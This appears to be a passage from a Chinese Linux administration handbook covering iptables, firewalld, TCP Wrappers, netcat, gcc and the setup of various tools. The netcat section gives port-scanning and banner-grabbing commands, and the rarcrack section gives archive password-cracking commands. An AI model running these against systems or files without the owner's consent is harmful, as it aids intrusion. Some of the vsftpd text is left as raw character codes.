处理流出的数据包（OUTPUT）； 处理转发的数据包（FORWARD）； 在进行路由选择后处理数据包（POSTROUTING）。 一般来说，从内网向外网发送的流量一般都是可控且良性的，因此我们使用最多的就是INPUT规则链，该规则链可以增大黑客人员从外网入侵内网的难度。 iptables 服务的术语:ACCEPT（允许流量通过）、REJECT（拒绝流量通过，拒绝流量后再回复一条&quot;您的信息已经收到，但是被扔掉了&quot;）、LOG（记录日志信息）、DROP（拒绝流量通过，直接将流量丢弃不响应）。当把Linux系统中的防火墙策略设置为REJECT拒绝动作后，流量发送方会看到端口不可达的响应：把Linux系统中的防火墙策略修改成DROP拒绝动作后，流量发送方会看到响应超时的提醒。但是流量发送方无法判断流量是被拒绝，还是接收方主机当前不在线 基本的命令参数 规则功能说明 1. Table 30: 表 filter 主要和主机自身有关，主要负责防火墙功能 过滤本机流入流出的数据包是默认使用的表 input 负责过滤所有目标地址是本机地址的数据包，就是过滤进入主机的数据包 forward 负责转发流经主机但不进入本机的数据包，和NAT关系很大 output 负责处理源地址的数据包，就是对本机发出的数据包; 2. NAT 表，负责网络地址转换，即来源于目的IP地址和端口的转换，一般用于共享上网或特殊端口的转换服务 Table 31: NAT snat 地址转换 dnat 标地址转换 pnat 标端口转换 3. mangle 表 将报文拆开来并修改报文标志位，最后封装起来 4. 5个检查点（内置链） PREROUTING INPUT FORWORD OUTPUT POSTROUTING iptables中常用的参数以及作用 Table 32: iptables中常用的参数以及作用 参数 作用 -P 设置默认策略 -F 清空规则链 -L 查看规则链 -A 在规则链的末尾加入新规则 -I num 在规则链的头部加入新规则 -D num 删除某一条规则 -s 匹配来源地址IP/MASK，加叹号“!”表示除这个IP外 -d 匹配目标地址 -i 网卡名称 匹配从这块网卡流入的数据 -o 网卡名称 匹配从这块网卡流出的数据 -p 匹配协议，如TCP、UDP、ICMP &amp;#x2013;dport num 匹配目标端口号 &amp;#x2013;sport num 匹配来源端口号 查看已有的防火墙规则链 $ iptables -L $ iptables -nvL –line-number -L 查看当前表的所有规则，默认查看的是filter表，如果要查看NAT表，可以加上-t NAT参数 -n 不对ip地址进行反查，加上这个参数显示速度会快很多 -v 输出详细信息，包含通过该规则的数据包数量，总字节数及相应的网络接口 –line-number 显示规则的序列号，这个参数在删除或修改规则时会用到 清空已有的防火墙规则链 $ iptables -F 添加规则 把INPUT规则链的默认策略设置为拒绝 $ iptables -P INPUT DROP 规则链的默认策略拒绝动作只能是DROP，而不能是REJECT。 向INPUT链中添加允许ICMP流量进入的策略规则 $ iptables -I INPUT -p icmp -j ACCEPT 在日常运维工作中，经常会使用ping命令来检查对方主机是否在线，而向防火墙的INPUT规则链中添加一条允许ICMP流量进入的策略规则就默认允许了 这种ping命令检测行为。 删除INPUT规则链中刚刚加入的那条策略（允许ICMP流量），并把默认策略设置为允许 $ iptables -D INPUT 1 $ iptables -P INPUT ACCEPT 将INPUT规则链设置为只允许指定网段的主机访问本机的22端口，拒绝来自其他所有主机的流量 $ iptables -I INPUT -s 192.168.10.0/24 -p tcp --dport 22 -j ACCEPT $ iptables -A INPUT -p tcp --dport 22 -j REJECT 向INPUT规则链中添加拒绝所有人访问本机12345端口的策略规则 $ iptables -I INPUT -p tcp --dport 12345 -j REJECT $ iptables -I INPUT -p udp --dport 12345 -j REJECT 向INPUT规则链中添加拒绝192.168.10.5主机访问本机80端口（Web服务）的策略规则 $ iptables -I INPUT -p tcp -s 192.168.10.5 --dport 80 -j REJECT 向INPUT规则链中添加拒绝所有主机访问本机1000～1024端口的策略规则 $ iptables -A INPUT -p tcp --dport 1000:1024 -j REJECT $ iptables -A INPUT -p udp --dport 1000:1024 -j REJECT 保存防火墙策略命令，使其永久生效 $ service iptables save Firewalld Firewalld(Dynamic Firewall Manager of Linux systems, Linux系统的动态防火墙管理器)，服务是默认的防火墙配置管理工具，它拥有基于CLI（命令行界面）和基于GUI（图形用户界面）的两种管理方式。 相较于传统的防火墙管理配置工具，firewalld支持动态更新技术并加入了区域（zone）的概念。简单来说，区域就是firewalld预先准备了几套防火墙策略集合（策略模板），用户可以根据生产场景的不同而选择合适的策略集合，从而实现防火墙策略之间的快速切换。 firewalld中常见的区域名称（默认为public）以及相应的策略规则如下表所示。 Table 33: firewalld中常用的区域名称及策略规则 区域 默认规则策略 trusted 允许所有的数据包 home 拒绝流入的流量，除非与流出的流量相关；而如果流量与ssh、mdns、ipp-client、amba-client与dhcpv6-client服务相关，则允许流量 internal 等同于home区域 work 拒绝流入的流量，除非与流出的流量相关；而如果流量与ssh、ipp-client与dhcpv6-client服务相关，则允许流量 public 拒绝流入的流量，除非与流出的流量相关；而如果流量与ssh、dhcpv6-client服务相关，则允许流量 external 拒绝流入的流量，除非与流出的流量相关；而如果流量与ssh服务相关，则允许流量 dmz 拒绝流入的流量，除非与流出的流量相关；而如果流量与ssh服务相关，则允许流量 block 拒绝流入的流量，除非与流出的流量相关 drop 拒绝流入的流量，除非与流出的流量相关 终端管理工具 firewall-cmd是firewalld防火墙配置管理工具的CLI（命令行界面）版本 Table 34: firewall-cmd命令中使用的参数以及作用 参数 作用 &amp;#x2013;get-default-zone 查询默认的区域名称 &amp;#x2013;set-default-zone=&amp;lt;区域名称&amp;gt; 设置默认的区域，使其永久生效 &amp;#x2013;get-zones 显示可用的区域 &amp;#x2013;get-services 显示预先定义的服务 &amp;#x2013;get-active-zones 显示当前正在使用的区域与网卡名称 &amp;#x2013;add-source= 将源自此IP或子网的流量导向指定的区域 &amp;#x2013;remove-source= 不再将源自此IP或子网的流量导向某个指定区域 &amp;#x2013;add-interface=&amp;lt;网卡名称&amp;gt; 将源自该网卡的所有流量都导向某个指定区域 &amp;#x2013;change-interface=&amp;lt;网卡名称&amp;gt; 将某个网卡与区域进行关联 &amp;#x2013;list-all 显示当前区域的网卡配置参数、资源、端口以及服务等信息 &amp;#x2013;list-all-zones 显示所有区域的网卡配置参数、资源、端口以及服务等信息 &amp;#x2013;add-service=&amp;lt;服务名&amp;gt; 设置默认区域允许该服务的流量 &amp;#x2013;add-port=&amp;lt;端口号/协议&amp;gt; 设置默认区域允许该端口的流量 &amp;#x2013;remove-service=&amp;lt;服务名&amp;gt; 设置默认区域不再允许该服务的流量 &amp;#x2013;remove-port=&amp;lt;端口号/协议&amp;gt; 设置默认区域不再允许该端口的流量 &amp;#x2013;reload 让“永久生效”的配置规则立即生效，并覆盖当前的配置规则 &amp;#x2013;panic-on 开启应急状况模式 &amp;#x2013;panic-off 关闭应急状况模式 使用firewalld配置的防火墙策略默认为运行时（Runtime）模式，又称为当前生效模式，而且随着系统的重启会失效。如果想让配置策略一直存在，就需要使用永久（Permanent）模式了，方法就是在用firewall-cmd命令正常设置防火墙策略时添加&amp;#x2013;permanent参数，这样配置的防火墙策略就可以永久生效了。但是，永久生效模式有一个“不近人情”的特点，就是使用它设置的策略只有在系统重启之后才能自动生效。如果想让配置的策略立生效，需要手动执行firewall-cmd &amp;#x2013;reload命令。 使用示例 查看firewalld服务当前所使用的区域 # firewall-cmd --get-default-zone 查询eno16777728网卡在firewalld服务中的区域 # firewall-cmd --get-zone-of-interface=eno16777728 把firewalld服务中eno16777728网卡的默认区域修改为external，并在系统重启后生效。分别查看当前与永久模式下的区域名称 # firewall-cmd --permanent --zone=external --change-interface=eno16777728 # firewall-cmd --get-zone-of-interface=eno16777728 # firewall-cmd --permanent --get-zone-of-interface=eno16777728 把firewalld服务的当前默认区域设置为public # firewall-cmd --set-default-zone=public # firewall-cmd --get-default-zone 启动/关闭firewalld防火墙服务的应急状况模式，阻断一切网络连接（当远程控制服务器时请慎用） # firewall-cmd --panic-on # firewall-cmd --panic-off 查询public区域是否允许请求SSH和HTTPS协议的流量 # firewall-cmd --zone=public --query-service=ssh # firewall-cmd --zone=public --query-service=https 把firewalld服务中请求HTTPS协议的流量设置为永久允许，并立即生效 # firewall-cmd --zone=public --add-service=https # firewall-cmd --permanent --zone=public --add-service=https # firewall-cmd --reload 把firewalld服务中请求HTTP协议的流量设置为永久拒绝，并立即生效： # firewall-cmd --permanent --zone=public --remove-service=http # firewall-cmd --reload 把在firewalld服务中访问8080和8081端口的流量策略设置为允许，但仅限当前生效 # firewall-cmd --zone=public --add-port=8080-8081/tcp # firewall-cmd --zone=public --list-ports 把原本访问本机888端口的流量转发到22端口，要且求当前和长期均有效 流量转发命令格式为: # firewall-cmd --permanent --zone=&amp;lt;区域&amp;gt; --add-forward-port=port=&amp;lt;源端口号&amp;gt;:proto=&amp;lt;协议&amp;gt;:toport=&amp;lt;目标端口号&amp;gt;:toaddr=&amp;lt;目标IP地址&amp;gt; # firewall-cmd --permanent --zone=public --add-forward-port=port=888:proto=tcp:toport=22:toaddr=192.168.10.10 # firewall-cmd --reload firewalld中的富规则表示更细致、更详细的防火墙策略配置，它可以针对系统服务、端口号、源地址和目标地址等诸多信息进行更有针对性的策略配置。它的优先级在所有的防火墙策略中也是最高的。比如，我们可以在firewalld服务中配置一条富规则，使其拒绝192.168.10.0/24网段的所有用户访问本机的ssh服务（22端口）： $ sudo firewall-cmd --permanent --zone=public --add-rich-rule=&quot;rule family=&quot;ipv4&quot; source address=&quot;192.168.10.0/24&quot; service name=&quot;ssh&quot; reject&quot; 图形化管理工具 服务的访问控制列表 TCP Wrappers是RHEL 7系统中默认启用的一款流量监控程序，它能够根据来访主机的地址与本机的目标服务程序作出允许或拒绝的操作。换句话说，Linux系统中其实有两个层面的防火墙，第一种是前面讲到的基于TCP/IP协议的流量过滤工具，而TCP Wrappers服务则是能允许或禁止Linux系统提供服务的防火墙，从而在更高层面保护了Linux系统的安全运行。 TCP Wrappers服务的防火墙策略由两个控制列表文件所控制。系统将会先检查允许控制列表文件（/etc/hosts.allow），如果匹配到相应的允许策略则放行流量；如果没有匹配，则去进一步匹配拒绝控制列表文件（/etc/hosts.deny），若找到匹配项则拒绝该流量。如果这两个文件全都没有匹配到，则默认放行流量。 Table 35: TCP Wrappers服务的控制列表文件中常用的参数 客户端类型 示例 满足示例的客户端列表 单一主机 192.168.10.10 IP地址为192.168.10.10的主机 指定网段 192.168.10. IP段为192.168.10.0/24的主机 指定网段 192.168.10.0/255.255.255.0 IP段为192.168.10.0/24的主机 指定DNS后缀 .linuxprobe.com 所有DNS后缀为.linuxprobe.com的主机 指定主机名称 www.linuxprobe.com 主机名称为www.linuxprobe.com的主机 指定所有客户端 ALL 所有主机全部包括在内 在配置TCP Wrappers服务时需要遵循两个原则： 编写拒绝策略规则时，填写的是服务名称，而非协议名称； 建议先编写拒绝策略规则，再编写允许策略规则，以便直观地看到相应的效果。 参考资料 iptables wiki iptables 百度百科 iptables debian wiki 5.5 Linux Logs 5.6 Linux Start 5.7 Linux Backup and Restore 5.8 Linux Software 5.8.1 在服务器上启用HTTPS 创建一个 2048 位 RSA 公钥/私钥对。 生成一个嵌入您的公钥的证书签名请求 (CSR) 将 CSR 与证书颁发机构 (CA) 共享以接收最终证书或证书链。 将最终证书安装在非网络可访问的位置，例如 /etc/ssl（Linux 和 Unix）或 IIS 需要它的位置 (Windows)。 1. 生成密钥和证书签名请求 此部分使用 openssl 命令行程序（大部分 Linux、BSD 和 Mac OS X 系统均附带此程序）来生成私钥/公钥和 CSR。 参考资料： 在服务器上启用 HTTPS 5.8.2 神奇的 nc 命令 介绍 netcat是网络工具中的瑞士军刀，它能通过TCP和UDP在网络中读写数据。通过与其他工具结合和重定向。 netcat所做的就是在两台电脑之间建立链接并返回两个数据流。你能建立一个服务器，传输文件，与朋友聊天，传输流媒体或者用它作为其它协议的独立客户端。 安装 // Redhat/CentOS/Fedora $ yum install nc // Debian/Ubuntu $ sudo apt-get install netcat 常见使用 端口扫描经常被系统管理员和黑客用来发现在一些机器上开放的端口，帮助他们识别系统中的漏洞。 $ nc -z -v -n 172.31.100.7 21-25 可以运行在TCP或者UDP模式，默认是TCP，-u参数调整为udp. z 参数告诉netcat使用0 IO,连接成功后立即关闭连接， 不进行数据交换(谢谢@jxing 指点) v 参数指使用冗余选项（译者注：即详细输出） n 参数告诉netcat 不要使用DNS反向查询IP地址的域名 Banner是一个文本，Banner是一个你连接的服务发送给你的文本信息。 一旦你发现开放的端口，你可以容易的使用netcat 连接服务抓取他们的banner。 $ nc -v 172.31.100.7 21 聊天工具 // Server $ nc -l 1234 // Client $ nc 172.168.100.7 1234 文件传输 // Server &amp;gt; Client $ nc -l 1234 &amp;gt; file.txt $ nc 172.168.100.7 1234 &amp;lt;file.txt 目录传输 // Server &amp;gt; Client $ tar -cvf - dir_name | nc -l 1234 $ nc -n 172.168.100.7 1234 | tar -xvf - 这里在A服务器上，我们创建一个tar归档包并且通过-在控制台重定向它，然后使用管道，重定向给netcat，netcat可以通过网络发送它。 在客户端我们下载该压缩包通过netcat 管道然后打开文件。 如果想要节省带宽传输压缩包，我们可以使用bzip2或者其他工具压缩。 // Server $ tar -cvf – dir_name| bzip2 -z | nc -l 1234 // Client $ nc -n 172.31.100.7 1234 | bzip2 -d |tar -xvf - 加密网络传输数据 // Server $ nc localhost 1234 | mcrypt –flush –bare -F -q -d -m ecb &amp;gt; file.txt // Client $ mcrypt –flush –bare -F -q -m ecb &amp;lt; file.txt | nc -l 1234 流视频 // Server $ cat video.avi | nc -l 1234 从一个视频文件中读入并重定向输出到netcat客户端 // Client $ nc 172.31.100.7 1234 | mplayer -vo x11 -cache 3000 - 从socket中读入数据并重定向到mplayer。 克隆一个设备 已经安装配置一台Linux机器并且需要重复同样的操作对其他的机器，而你不想在重复配置一遍。 假如你的系统在磁盘/dev/sda上: // Server $ dd if=/dev/sda | nc -l 1234 // Client $ nc -n 172.31.100.7 1567 | dd of=/dev/sda dd是一个从磁盘读取原始数据的工具，我通过netcat服务器重定向它的输出流到其他机器并且写入到磁盘中，它会随着分区表拷贝所有的信息。 但是如果我们已经做过分区并且只需要克隆root分区，我们可以根据我们系统root分区的位置，更改sda 为sda1，sda2.等等。 参考资料 https://blog.csdn.net/zhangxiao93/article/details/52705642 5.8.3 GCC 简单编译 $ gcc test.c -o test 实质上，以上这条命令编译过程分为四个阶段进行的，即预处理（预编译，Preprocessing）、编译（Compilation）、汇编（Assembly）和连接（Linking）。 1.Preprocessing $ gcc -E test.c -o test.i 或 $ gcc -E test.c gcc 的 -E 选项，可以让编译器在预处理后停止，并输出预处理结果。在本例中，预处理结果就是将 stdio.h 文件中的内容插入到 test.c 中了。 2.Compilation $ gcc -S test.i -o test.s gcc 的 -S 选项，表示在程序编译期间，在生成汇编代码后，停止，-o 输出汇编代码文件。 3.Assembly $ gcc -c test.s -o test.o 对于上一小节中生成的汇编代码文件 test.s，gas 汇编器负责将其编译为目标文件 4.Linking gcc 连接器是 gas 提供的，负责将程序的目标文件与所需的所有附加的目标文件连接起来，最终生成可执行文件。附加的目标文件包括静态连接库和动态连接库。 对于上一小节中生成的 test.o，将其与 Ｃ 标准输入输出库进行连接，最终生成程序 test $ gcc test.o -o test 多个程序文件的编译 $ gcc test1.c test2.c -o test 检错 $ gcc -pedantic test.c -o test //警告信息 $ gcc -Wall test.c -p test //-Werror 选项，那么 GCC 会在所有产生警告的地方停止编译，迫使程序员对自己的代码进行修改 $ gcc -Werror test.c -o test 库文件连接 1.编译可执行文件。首先我们要进行编译 test.c 为目标文件，这个时候需要执行 $ gcc –c –I /usr/dev/mysql/include test.c –o test.o 2.链接。最后我们把所有目标文件链接成可执行文件: $ gcc –L /usr/dev/mysql/lib –lmysqlclient test.o –o test 3.强制链接时使用静态链接库。默认情况下， GCC 在链接时优先使用动态链接库，只有当动态链接库不存在时才考虑使用静态链接库，如果需要的话可以在编译时加上 -static 选项，强制使用静态链接库。 $ gcc –L /usr/dev/mysql/lib –static –lmysqlclient test.o –o test 其他 静态库链接时搜索路径顺序： 1. ld 会去找GCC命令中的参数 -L 2. 再找 gcc 的环境变量 LIBRARY_PATH 3. 再找内定目录 /lib /usr/lib /usr/local/lib 这是当初 compile gcc 时写在程序内的 动态链接时、执行时搜索路径顺序: 1. 编译目标代码时指定的动态库搜索路径 2. 环境变量 LD_LIBRARY_PATH 指定的动态库搜索路径 3. 配置文件 /etc/ld.so.conf 中指定的动态库搜索路径 4. 默认的动态库搜索路径 /lib 5. 默认的动态库搜索路径 /usr/lib 有关环境变量： LIBRARY_PATH 环境变量：指定程序静态链接库文件搜索路径 LD_LIBRARY_PATH 环境变量：指定程序动态链接库文件搜索路径 Reference http://www.cnblogs.com/ggjucheng/archive/2011/12/14/2287738.html 5.8.4 系统状态监视命令：top &amp;amp; htop top htop 下载及安装 $ git clone https://github.com/hishamhm/htop $ tar zxvf htop-2.0.2.tar.gz $ cd htop-2.0.2 $ ./configure # make &amp;amp;&amp;amp; make install 错误解决 configure: error: missing libraries: libncurses Solving: $ sudo apt-get install nucurses-dev 5.8.5 网络监视命令：iftop $ sudo apt-get install iftop 5.8.6 wget vs axel 官方地址: http://axel.alioth.debian.org/ 描述: 替换wget命令 5.8.7 VIM&amp;amp;Emacs 两个神器软件单独介绍，这里不重复叙写。 5.8.8 MPlayer // official：http://www.mplayerhq.hu/design7/news.html $ tar -Jxf MPlayer-1.1.1.tar.xz $ cd MPlayer-1.1.1 $ sudo ./configure // 发现，需要安装一个依赖包:yasm $ wget http://www.tortall.net/projects/yasm/releases/yasm-1.2.0.tar.gz // 安装完成后，重新配置、编译和安装 $ sudo ./configure $ sudo make &amp;amp;&amp;amp; make install 5.8.9 google-chrome &amp;amp; chromium 添加安装源 $ sudo vim /etc/apt/sources.list deb http://dl.google.com/linux/chrome/deb/ stable main 添加公钥验证下载 $ wget https://dl-ssl.google.com/linux/linux_signing_key.pub $ apt-key add linux_signing_key.pub 执行安装 $ sudo apt update // stable ersion $ sudo apt install google-chrome-stable // beta or unstable ersion $ sudo apt install google-chrome-beta $ sudo apt install google-chrome-unstable 安装 chromium $ sudo apt-get update $ sudo apt-get install chromium chromium-l10n （chromium-l10n 是用于本地化界面的，是可选的软件包） 注意：chromium不支持PDF查看 5.8.10 Scrot：截图工具 安装 $ sudo apt-get install scrot 使用方法 整个桌面截图(Full desktop) $ scrot $ scrot ~/Downloads/my_desktop.png //Saving to specified directory. 特定区域截图（选择截取）(Specific area) $ scrot -s 延迟截图(temporize screenshot) $ scrot -s -d 5 截图调整质量(Adjust the quality of screenshots) $ scrot -q 50 截图调整大小(Adjust the screen size) $ scrot -t 10 将截图发送给其他命令(Deliver the intercepted screenshots to other commands) $ scrot -e 'mv $f ~/screenshots' 参考资料(References) https://linux.cn/article-3197-1.html 5.8.11 rarcrack（压缩包密码破解工具） 支持格式：rar,7z,zip // install $ sudo apt-get install libxml2-dev build-essential $ sudo apt-get install rarcrack // use $ rarcrack --threads 10 --type rar test.rar 5.8.12 宝塔面板 一款使用方便、功能强大且终身免费的服务器管理软件。详见官网:http://www.bt.cn/ 5.8.13 Cisco AnyConnect VPN Client 问题解决 $ sudo systemctl enable vpnagentd_init vpnagentd_init.service is not a native service, redirecting to systemd-sysv-install. Executing: /lib/systemd/systemd-sysv-install enable vpnagentd_init insserv: warning: script 'vpnagentd_init' missing LSB tags and overrides insserv: There is a loop between service bt and vpnagentd_init if stopped insserv: loop involving service vpnagentd_init at depth 2 insserv: loop involving service bt at depth 1 insserv: Stopping vpnagentd_init depends on bt and therefore on system facility `$all' which can not be true! insserv: exiting now without changing boot order! update-rc.d: error: insserv rejected the script header [solve]：$ sudo vim /etc/init.d/vpnagentd_init #!/bin/sh ### BEGIN INIT INFO # Provides: vpnagentd_init # Required-Start: $remote_fs $syslog # Required-Stop: $remote_fs $syslog # Default-Start: 2 3 4 5 # Default-Stop: 0 1 6 # Short-Description: Start Cisco vpn agent daemon at boot time # Description: Cisco vpn agent daemon ### END INIT INFO 5.8.14 Bind：DNS工具 安装 # yum install -y bind 配置 1)# vim /etc/named.conf 修改内容如下： 将下面 listen-on port 53 { 127.0.0.1; }; allow-query { localhost; }; 改为 listen-on port 53 { any; }; allow-query { any; }; 2)# vim named.rfc1912.zones 注意改动位置： zone &quot;zrg.com.cn&quot; IN { type master; file &quot;named.zrg&quot;; allow-update { none; }; }; 3)# cp /var/named/named.localhost /var/named/named.zrg //修改文件所属群组 #chgrp named /var/named/named.zrg 4)# vim /var/named/named.zrg 注意改动位置： $TTL 1D @ IN SOA @ dns.zrg.com.cn. root( 0 ; serial 1D ; refresh 1H ; retry 1W ; expire 3H ) ; minimum NS dns.zrg.com.cn. DNS A 192.168.120.166 A 127.0.0.1 AAAA ::1 5)# /etc/init.d/named restart # chkconfig named on 6)# vim /etc/sysconfig/network Network=yes Hostname=dns.zrg.com.cn 7)# vim /etc/resolv.conf Search zrg.com.cn Nameserver 192.168.120.166 8)# /etc/init.d/named restart # ping zrg.com.cn # reboot 5.8.15 Composer 安装 1.Download composer.phar file. 2.Excute: # php composer.phar 3.Global: # mv composer.phar /usr/local/bin/composer 4.Permission: # chmod 744 composer 问题解决 error: /usr/bin/env: php: No such file or directory solve:Configuring php to become global variables 5.8.16 vsftpd Download and Install https://security.appspot.com/vsftpd.html#download //yum yum install -y vsftpd Change default dir #local user local_root=/usr/share/nginx/html #is_enable local view,default_setting is NO chroot_local_user=NO #anonymous user anon_root=/var/ftp/pub Configuring directory of access chroot_local_user=YES chroot_list_enable=NO allow_writeable_chroot=YES &amp;#25253;&amp;#22914;&amp;#19979;&amp;#38169;&amp;#35823;&amp;#65292;&amp;#26159;&amp;#22240;&amp;#20026;&amp;#27809;&amp;#26377;&amp;#28155;&amp;#21152;&amp;#19978;&amp;#38754;&amp;#30340;&amp;#31532;&amp;#19977;&amp;#26465;&amp;#35821;&amp;#21477;&amp;#65292;&amp;#23548;&amp;#33268;&amp;#29992;&amp;#25143;&amp;#26080;&amp;#27861;&amp;#38145;&amp;#23450;&amp;#33258;&amp;#24049;&amp;#30340;&amp;#30446;&amp;#24405;&amp;#12290; 500 OOPS: vsftpd: refusing to run with writable root inside chroot() notice: &amp;#37197;&amp;#32622;&amp;#20855;&amp;#20307;&amp;#24773;&amp;#20917;&amp;#26377;&amp;#20197;&amp;#19979;&amp;#20960;&amp;#31181;&amp;#65306; 1&amp;#65289;&amp;#24403; chroot_list_enable=yes&amp;#65292;chroot_local_user=yes&amp;#26102;&amp;#65292;&amp;#22312;/etc/vsftpd/chroot_list&amp;#25991;&amp;#20214; &amp;#20013;&amp;#21015;&amp;#20986;&amp;#30340;&amp;#29992;&amp;#25143;&amp;#65292;&amp;#21487;&amp;#20197;&amp;#20999;&amp;#25442;&amp;#21040;&amp;#19978;&amp;#32423;&amp;#30446;&amp;#24405;&amp;#65307;&amp;#26410;&amp;#22312;&amp;#25991;&amp;#20214;&amp;#20013;&amp;#21015;&amp;#20986;&amp;#30340;&amp;#29992;&amp;#25143;&amp;#65292;&amp;#19981;&amp;#33021;&amp;#20999;&amp;#25442;&amp;#21040;&amp;#31449;&amp;#28857;&amp;#26681;&amp;#30446;&amp;#24405;&amp;#30340;&amp;#19978;&amp;#32423;&amp;#30446;&amp;#24405;&amp;#12290; 2&amp;#65289;&amp;#24403; chroot_list_enable=yes&amp;#65292;chroot_local_user=no&amp;#26102;&amp;#65292;&amp;#22312;/etc/vsftpd/chroot_list&amp;#25991;&amp;#20214;&amp;#20013; &amp;#21015;&amp;#20986;&amp;#30340;&amp;#29992;&amp;#25143;&amp;#65292;&amp;#19981;&amp;#33021;&amp;#20999;&amp;#25442;&amp;#21040;&amp;#31449;&amp;#28857;&amp;#26681;&amp;#30446;&amp;#24405;&amp;#30340;&amp;#19978;&amp;#32423;&amp;#30446;&amp;#24405;&amp;#65307;&amp;#26410;&amp;#22312;&amp;#25991;&amp;#20214;&amp;#20013;&amp;#21015;&amp;#20986;&amp;#30340;&amp;#29992;&amp;#25143;&amp;#65292;&amp;#21487;&amp;#20197;&amp;#20999;&amp;#25442;&amp;#21040;&amp;#19978;&amp;#32423;&amp;#30446;&amp;#24405;&amp;#12290; 3&amp;#65289;&amp;#24403; chroot_list_enable=no&amp;#65292;chroot_local_user=yes&amp;#26102;&amp;#65292;&amp;#25152;&amp;#26377;&amp;#29992;&amp;#25143;&amp;#22343;&amp;#19981;&amp;#33021;&amp;#20999;&amp;#25442;&amp;#21040;&amp;#19978;&amp;#32423;&amp;#30446;&amp;#24405;&amp;#12290; 4&amp;#65289;&amp;#24403; chroot_list_enable=no&amp;#65292;chroot_local_user=no&amp;#26102;&amp;#65292;&amp;#25152;&amp;#26377;&amp;#29992;&amp;#25143;&amp;#22343;&amp;#21487;&amp;#20197;&amp;#20999;&amp;#25442;&amp;#21040;&amp;#19978;&amp;#32423;&amp;#30446;&amp;#24405;&amp;#12290; 5&amp;#65289;&amp;#24403;&amp;#29992;&amp;#25143;&amp;#19981;&amp;#20801;&amp;#35768;&amp;#20999;&amp;#25442;&amp;#21040;&amp;#19978;&amp;#32423;&amp;#30446;&amp;#24405;&amp;#26102;&amp;#65292;&amp;#30331;&amp;#24405;&amp;#21518;ftp&amp;#31449;&amp;#28857;&amp;#30340;&amp;#26681;&amp;#30446;&amp;#24405;&amp;#8220;/&amp;#8221;&amp;#26159;&amp;#35813;ftp&amp;#36134;&amp;#25143;&amp;#30340;&amp;#20027;&amp;#30446;&amp;#24405;&amp;#65292;&amp;#21363;&amp;#25991;&amp;#20214;&amp;#30340;&amp;#31995;&amp;#32479;&amp;#30340;/var/ftp&amp;#30446;&amp;#24405;&amp;#12290; my vsftpd.conf //CentOS 7, /etc/vsftpd/vsftpd.conf. # Example config file /etc/vsftpd/vsftpd.conf # Allow anonymous FTP? (Beware - allowed by default if you comment this out). anonymous_enable=NO # local_root=/srv/www/ # # Uncomment this to allow local users to log in. # When SELinux is enforcing check for SE bool ftp_home_dir local_enable=YES # # Uncomment this to enable any form of FTP write command. write_enable=YES # # Default umask for local users is 077. You may wish to change this to 022, # if your users expect that (022 is used by most other ftpd's) local_umask=022 # # Uncomment this to allow the anonymous FTP user to upload files. This only # has an effect if the above global write enable is activated. Also, you will # obviously need to create a directory writable by the FTP user. # When SELinux is enforcing check for SE bool allow_ftpd_anon_write, allow_ftpd_full_access #anon_upload_enable=YES # # Uncomment this if you want the anonymous FTP user to be able to create # new directories. #anon_mkdir_write_enable=YES # # Activate directory messages - messages given to remote users when they # go into a certain directory. dirmessage_enable=YES # # Activate logging of uploads/downloads. xferlog_enable=YES # # Make sure PORT transfer connections originate from port 20 (ftp-data). connect_from_port_20=YES # # If you want, you can arrange for uploaded anonymous files to be owned by # a different user. Note! Using &quot;root&quot; for uploaded files is not # recommended! #chown_uploads=YES #chown_username=whoever # # You may override where the log file goes if you like. The default is shown # below. #xferlog_file=/var/log/xferlog # # If you want, you can have your log file in standard ftpd xferlog format. # Note that the default log file location is /var/log/xferlog in this case. xferlog_std_format=YES # # You may change the default value for timing out an idle session. #idle_session_timeout=600 # # You may change the default value for timing out a data connection. #data_connection_timeout=120 # # It is recommended that you define on your system a unique user which the # ftp server can use as a totally isolated and unprivileged user. #nopriv_user=ftpsecure # # Enable this and the server will recognise asynchronous ABOR requests. Not # recommended for security (the code is non-trivial). Not enabling it, # however, may confuse older FTP clients. #async_abor_enable=YES # # By default the server will pretend to allow ASCII mode but in fact ignore # the request. Turn on the below options to have the server actually do ASCII # mangling on files when in ASCII mode. # Beware that on some FTP servers, ASCII support allows a denial of service # attack (DoS) via the command &quot;SIZE /big/file&quot; in ASCII mode. vsftpd # predicted this attack and has always been safe, reporting the size of the # raw file. # ASCII mangling is a horrible feature of the protocol. #ascii_upload_enable=YES #ascii_download_enable=YES # # You may fully customise the login banner string: #ftpd_banner=Welcome to blah FTP service. # # You may specify a file of disallowed anonymous e-mail addresses. Apparently # useful for combatting certain DoS attacks. #deny_email_enable=YES # (default follows) #banned_email_file=/etc/vsftpd/banned_emails # # You may specify an explicit list of local users to chroot() to their home # directory. If chroot_local_user is YES, then this list becomes a list of # users to NOT chroot(). # (Warning! chroot'ing can be very dangerous. If using chroot, make sure that # the user does not have write access to the top level directory within the # chroot) chroot_local_user=YES chroot_list_enable=YES allow_writeable_chroot=YES # (default follows) chroot_list_file=/etc/vsftpd/chroot_list # # You may activate the &quot;-R&quot; option to the builtin ls. This is disabled by # default to avoid remote users being able to cause excessive I/O on large # sites. However, some broken FTP clients such as &quot;ncftp&quot; and &quot;mirror&quot; assume # the presence of the &quot;-R&quot; option, so there is a strong case for enabling it. #ls_recurse_enable=YES # # When &quot;listen&quot; directive is enabled, vsftpd runs in standalone mode and # listens on IPv4 sockets. This directive cannot be used in conjunction # with the listen_ipv6 directive. listen=NO # # This directive enables listening on IPv6 sockets. By default, listening # on the IPv6 &quot;any&quot; address (::) will accept connections from both IPv6 # and IPv4 clients. It is not necessary to listen on *both* IPv4 and IPv6 # sockets. If you want that (perhaps because you want to listen on specific # addresses) then you must run two copies of vsftpd with two configuration # files. # Make sure, that one of the listen options is commented !! listen_ipv6=YES pam_service_name=vsftpd userlist_enable=YES tcp_wrappers=YES References https://security.appspot.com/vsftpd.html https://en.wikipedia.org/wiki/Vsftpd http://baike.baidu.com/item/vsftpd 5.8.17 Cygwin：windows 下 Linux 模拟软件 安装Cygwin 略 提示：安装软件时，可使用中国科技大学软件源mirrors.ustc.edu.cn/cygwin // 举例说明：安装及配置ssh 1.运行安装文件 2.搜索ssh，在Net类别下选上OpenSSH和OpenSSL两项 3.安装完成后，打开Cygwin，输入ssh-host-config 当询问if privilege separation should be used 时输入 no . 当询问if sshd should be installed as a service 时输入yes . 当询问about the value of CYGWIN environment variable enter 时输入 ntsec . 其余询问均输入 no 4.在cygwin中输入 cygrunsrv --start sshd 启动sshd 5.打开cygwin，输入 ssh-keygen，当询问要filenames 和 pass phrases 的时候都点回车，接受默认的值 6.命令结束后输入 cd ~/.ssh 转到.ssh目录，输入 ls –l 应该包含两个文件：id_rsa.pub 和 